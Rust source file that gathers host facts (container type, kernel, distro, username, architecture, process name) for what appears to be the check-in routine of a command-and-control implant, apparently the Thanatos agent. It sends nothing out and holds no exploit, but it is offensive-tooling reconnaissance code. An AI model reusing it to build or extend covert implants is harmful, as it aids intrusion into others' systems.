use std::io::{BufRead, BufReader};

use errors::ThanatosError;
use ffiwrappers::linux::{
    uname::{self, UtsName},
    user::UserInfo,
};

use crate::proto::checkin::{Architecture, ContainerEnv};

mod dnsname;
pub use dnsname::{domain, hostname};

mod integrity;
pub use integrity::integrity_level;

mod selinux;
pub use selinux::selinux_enabled;

pub fn container_environment() -> ContainerEnv {
    if let Ok(readdir) = std::fs::read_dir("/") {
        for entry in readdir.flatten() {
            if entry.file_name() == ".dockerenv" {
                return ContainerEnv::Docker;
            }
        }
    }

    if let Ok(readdir) = std::fs::read_dir("/run") {
        for entry in readdir.flatten() {
            if entry.file_name() == ".containerenv" {
                return ContainerEnv::Container;
            }
        }
    }

    ContainerEnv::None
}

pub fn kernel() -> Option<String> {
    UtsName::new().ok().map(|u| u.release().to_owned())
}

pub fn distro() -> Option<String> {
    let f = std::fs::File::open("/etc/os-release").ok()?;
    let reader = BufReader::new(f);

    let mut name = String::new();
    let mut version = String::new();

    for line in reader.lines().map_while(Result::ok) {
        if line.starts_with("NAME=") {
            let s = line.split('=');
            if let Some(name_quoted) = s.last() {
                name = name_quoted[1..name_quoted.len() - 1].to_string();
            }
            continue;
        }

        if line.starts_with("VERSION=") {
            let s = line.split('=');
            if let Some(version_quoted) = s.last() {
                version = version_quoted[1..version_quoted.len() - 1].to_string();
            }

            continue;
        }

        if line.starts_with("PRETTY_NAME=") {
            let s = line.split('=');
            if let Some(pretty_name_quoted) = s.last() {
                return Some(pretty_name_quoted[1..pretty_name_quoted.len() - 1].to_string());
            }

            continue;
        }
    }

    if name.is_empty() && version.is_empty() {
        None
    } else {
        Some(format!("{} {}", name, version))
    }
}

pub fn username() -> Result<String, ThanatosError> {
    UserInfo::current_user()
        .map(|userinfo| userinfo.username().to_string())
        .map_err(ThanatosError::FFIError)
}

pub fn architecture() -> Option<Architecture> {
    match uname::UtsName::new().ok()?.machine() {
        "x86_64" => Some(Architecture::X8664),
        "x86" => Some(Architecture::X86),
        _ => None,
    }
}

pub fn process_name() -> Result<String, ThanatosError> {
    std::fs::read_to_string("/proc/self/comm").map_err(ThanatosError::IoError)
}
